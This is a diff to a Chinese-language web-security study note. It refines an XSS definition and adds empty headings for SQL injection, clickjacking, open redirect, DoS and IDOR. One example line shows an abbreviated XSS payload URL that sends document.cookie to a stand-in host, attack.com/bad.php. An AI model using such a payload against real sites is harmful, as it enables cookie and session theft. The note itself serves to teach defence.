@@ -10,7 +10,7 @@ layout: blog
 ## XSS
 
 - Cross-site scripting
-- 利用動態產生內容的網頁漏洞，注入惡意腳本的攻擊手法
+- 利用動態產生內容（ex. 輸入欄位）的網頁漏洞，注入惡意腳本的攻擊手法
 - 例如使用短網址包覆帶有惡意腳本的網址：
   `http://app.com/?name=?<script>...attack.com/bad.php?data=document.cookie;</script>`
 - 攻擊者便可取得使用者的 Cookie，並藉此盜用相關資料
@@ -34,6 +34,16 @@ layout: blog
 | 執行源頭 | 網頁瀏覽器 (Client)           | 網頁伺服器 (Server)        |
 | 執行內容 | JavaScript 所能執行的任意內容 | 網頁應用程式內所定義的處理 |
 | 執行前提 | 無                            | 受害者需先登入網頁應用程式 |
+
+## SQL Injection
+
+## ClickJacking
+
+## Open Redirect
+
+## DOS
+
+## Insecure Direct Object Reference Vulnerability
 
 ## JSON Hijacking
 
